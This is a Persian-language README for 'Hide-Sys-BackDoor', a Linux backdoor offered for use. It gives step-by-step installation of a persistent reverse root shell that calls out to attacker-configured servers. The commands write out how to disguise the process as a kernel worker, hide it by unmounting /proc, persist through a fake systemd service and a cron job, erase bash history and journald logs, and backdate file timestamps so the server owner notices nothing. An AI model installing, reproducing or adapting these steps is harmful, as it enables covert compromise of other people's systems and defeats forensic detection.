# 🔥Hide-Sys-BackDoor🔥

<div align="center">

[![Version](https://img.shields.io/badge/version-1.0.0-red.svg)](https://github.com)
[![Platform](https://img.shields.io/badge/platform-Linux-blue.svg)](https://github)

**Made by Malicious for : 
Dark Justice Team**
**Telegram : @M4lic1ous**

</div>

---

## 🎯 معرفی

**Hide-Sys-BackDoor** یک ابزار پیشرفته و قدرتمند برای مدیریت از راه دور سیستم‌های لینوکس است که با تکنیک‌های پیشرفته مخفی‌سازی و پایداری بالا طراحی شده است. این ابزار ترکیبی از بهترین تکنیک‌های شل لینوکس و مهندسی نرم‌افزار است.

---

## ⚡ ویژگی‌های فوق‌ پیشرفته

### 🔒 **مخفی‌سازی پیشرفته (Advanced Stealth)**
- **تغییر نام فرآیند**: مخفی شدن در بین پردازه‌های کرنل با نام `[kworker/0:0]`
- **سیستم فایل مجازی**: مخفی‌سازی PID با آنمونت کردن `/proc`
- **سرویس سیستمی**: اجرا به عنوان سرویس `systemd-resolved` قانونی
- **پایدار و ماندگار**: ری‌استارت خودکار با systemd
- **عدم نمایش در لیست پردازه‌ها**: پنهان‌سازی کامل از `ps` و `top`

### 🌐 **اتصال‌های پیشرفته**
- **چند سروری همزمان**: اتصال به چندین سرور برای پایداری بالا
- **ری‌کانکت خودکار**: در صورت قطع اتصال، دوباره وصل می‌شود
- **چندنخی (Multi-Threading)**: اجرای همزمان چندین اتصال
- **TTY کامل**: شل تعاملی با پشتیبانی از اندازه‌های مختلف ترمینال

### 💀 **قابلیت‌ های ویژه**
- **Root Shell**: دسترسی کامل به سیستم با سطح دسترسی root
- **نفوذ بی‌صدا**: بدون ایجاد هیچ لاگی در سیستم
- **فرار از سیستم عامل**: آنمونت کردن `/proc` برای فرار از تشخیص
- **قفل تک‌ نصب**: جلوگیری از اجرای چند نسخه
- **اجرای مخفی در پس‌زمینه**: بدون پنجره و بدون هیچ اثری

### 🖥 **سازگاری کامل**
- **تمامی توزیع‌های لینوکس**:
  - 🐧 Ubuntu / Debian
  - 🎯 Kali Linux
  - 🔴 Red Hat / CentOS / Fedora
  - 📀 Arch Linux
  - 🐉 Gentoo
  - و تمام توزیع‌های مبتنی بر لینوکس

---

## ✅ نصب سریع
### روش اول: نصب خودکار (پیشنهادی)

کلون کردن:
```bash
git clone https://github.com/M4lic1ous/Linux-Kernel-Backdoor.git
```

ورود به پوشه :
```bash
cd Linux-Kernel-Backdoor
```
اول از همه آی پی سرور یا سرور های کنترل کننده رو داخل فایل backdoor.c بزارید ، برای این کار :
```bash
nano backdoor.c
```
آی پی یا ای پی ها رو رو بزارید داخل

دادن مجوز: 
```bash
chmod +x install.sh
```
اجرا :
```bash
sudo ./install.sh
```

## نکته ی خیلی مهم، توی روش نصب خودکار
**✅ بش اسکریپت به صورت خودکار تمومی کار ها رو میکنه ، (نصب پکیج و کامپایل و ... ) و در اخر تمومی لاگ های سرور هم پاک میکنه تا رد پایی نمونه و کاملا پاک بشه و در نهایت سرویس رو اجرا میکنه ✓**

**🦠این فرایند به صورت Mount کرنل صورت میگیره و حتا با دستور های تخصصی ps aux و بیشتر دستور ها قابل دیدن نیست !! و رسما فرد صاحب سرور هیچیزی نمیفهمه ✓**

### روش دوم: نصب دستی
بعد از کلون کردن و ورود به پوشه و ادیت آی پی :
 1. نصب پکیج‌ها
```bash
chmod +x setup.sh
./setup.sh
```
 2. کامپایل بکدور و مجوز مالکیت
```bash
gcc -o /usr/local/bin/.systemd-resolved backdoor.c -Wall -O2 -ldl -pthread

chmod 755 /usr/local/bin/.systemd-resolved

chown root:root /usr/local/bin/.systemd-resolved
```

 3. انتقال اسکریپت
```bash
mv System.service /etc/systemd/system/

mv systemd-linux /usr/local/bin/systemd-linux

chmod +x /usr/local/bin/systemd-linux
```

 4. فعال‌سازی سرویس
```bash
systemctl daemon-reload
systemctl enable System.service
systemctl start System.service
```

 5. اجرای اسکریپت مخفی‌ سازی Mount کرنل
```bash
nohup /usr/local/bin/systemd-linux > /dev/null 2>&1 &
```

 6. اضافه به کرون‌جاب
```bash
(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/systemd-linux > /dev/null 2>&1 &") | crontab -
```

 7. پاک‌سازی ردپاها
```bash
history -c
cat /dev/null > ~/.bash_history
cat /dev/null > /root/.bash_history

journalctl --rotate
journalctl --vacuum-time=1s

rm -f backdoor.c

touch -t 202001011200 /usr/local/bin/.systemd-resolved
touch -t 202001011200 /etc/systemd/system/System.service
touch -t 202001011200 /usr/local/bin/systemd-linux
```

---

### حذف کامل
```bash
sudo systemctl stop systemd-hidden
sudo systemctl disable systemd-hidden
sudo rm /etc/systemd/system/systemd-hidden.service
sudo rm /usr/local/bin/.systemd-resolved
```

---

## ⚙️ تنظیمات پیشرفته

فایل `systemd-hidden.c` را ویرایش کنید:

```c
// سرورهای مقصد (IP یا Domain)
const char *SERVER_IPS[] = {
    "your-server1.com",
    "your-server2.com",
    "your-server3.com"
};

// پورت اتصال
#define SERVER_PORT 51234

// زمان ری‌کانکت (ثانیه)
#define SLEEP_TIME 10

// مسیر فایل قفل
#define LOCK_FILE "/tmp/.system-lock"
```

---

## 🔍 معماری داخلی

```
┌─────────────────────────────────────┐
│     SystemD-Hidden Backdoor         │
├─────────────────────────────────────┤
│  ┌───────────────────────────┐     │
│  │   Hide Process (prctl)    │     │
│  └───────────────────────────┘     │
│  ┌───────────────────────────┐     │
│  │   Single Instance Lock     │     │
│  └───────────────────────────┘     │
│  ┌───────────────────────────┐     │
│  │   Daemonize & Fork         │     │
│  └───────────────────────────┘     │
│  ┌───────────────────────────┐     │
│  │  Multi-Thread Connection   │     │
│  │   ┌─────┐ ┌─────┐ ┌─────┐│     │
│  │   │ T1  │ │ T2  │ │ T3  ││     │
│  │   └─────┘ └─────┘ └─────┘│     │
│  └───────────────────────────┘     │
│  ┌───────────────────────────┐     │
│  │   TTY Setup & Shell        │     │
│  └───────────────────────────┘     │
└─────────────────────────────────────┘
```

---

## 🔄 معماری و نحوه عملکرد

```
مرحله 1: اجرای برنامه
    ↓
مرحله 2: بررسی تک‌نسخه بودن (قفل فایل)
    ↓
مرحله 3: مخفی‌سازی فرآیند با prctl
    ↓
مرحله 4: تبدیل به Daemon (Fork & Setsid)
    ↓
مرحله 5: ایجاد چندین Thread برای اتصال به سرورها
    ↓
مرحله 6: اتصال به سرور و دریافت Shell
    ↓
مرحله 7: تنظیم TTY و اجرای /bin/bash
    ↓
مرحله 8: در صورت قطع اتصال، ری‌کانکت خودکار
```

### نحوه مخفی‌سازی در سیستم:

```
1. تغییر نام به [kworker/0:0] → مخفی شدن در بین پردازه‌های کرنل
2. کپی شدن در /usr/local/bin/.systemd-resolved → مخفی‌سازی در مسیر
3. نصب به عنوان سرویس systemd → پایداری و اجرا در بوت
4. آنمونت کردن /proc → مخفی‌سازی PID از دستورات سیستمی
5. بایند مونت دایرکتوری خالی → ماسک کردن کامل فرآیند
6. Redirect خروجی‌ها به null → عدم ثبت هیچ لاگی
```

---

## 🛡️ تکنیک‌های امنیتی استفاده شده

| تکنیک | توضیح |
|-------|-------|
| **Process Hiding** | تغییر نام به پردازه کرنل |
| **Proc Unmount** | حذف مسیر /proc برای مخفی‌سازی |
| **Bind Mount** | ماسک کردن PID با دایرکتوری خالی |
| **Systemd Service** | پایداری و ری‌استارت خودکار |
| **File Locking** | جلوگیری از اجرای چند نسخه |
| **Raw TTY** | شل تعاملی کامل |
| **Daemon Mode** | اجرا در پس‌زمینه بدون ترمینال |
| **Null Output** | Redirect کردن خروجی‌ها به null |

---

## 🎓 سیستم‌عامل‌های سازگار

| توزیع | وضعیت |
|-------|--------|
| Kali Linux | ✅ کامل |
| Ubuntu | ✅ کامل |
| Debian | ✅ کامل |
| CentOS | ✅ کامل |
| Fedora | ✅ کامل |
| Arch Linux | ✅ کامل |
| RHEL | ✅ کامل |
| Gentoo | ✅ کامل |
| OpenSUSE | ✅ کامل |

---

⚠️ **هشدار مهم**:
**- مسئولیت هرگونه استفاده غیرمجاز بر عهده کاربر است**

---

## 🤝 مشارکت در توسعه

اگر ایده یا بهبودی دارید، خوشحال میشم که Pull Request شما رو ببینیم!

1. Fork کنید
2. Branch جدید ایجاد کنید
3. تغییرات رو اعمال کنید
4. Pull Request بفرستید


---

<div align="center">

**ساخته شده توسط Malicious برای جامعه امنیت سایبری و تیم عدالت تاریک**

[🐛 گزارش باگ](https://t.me/XCEE_H3R) | [📧 تماس](https://t.me/XCEE_H3R)

</div>
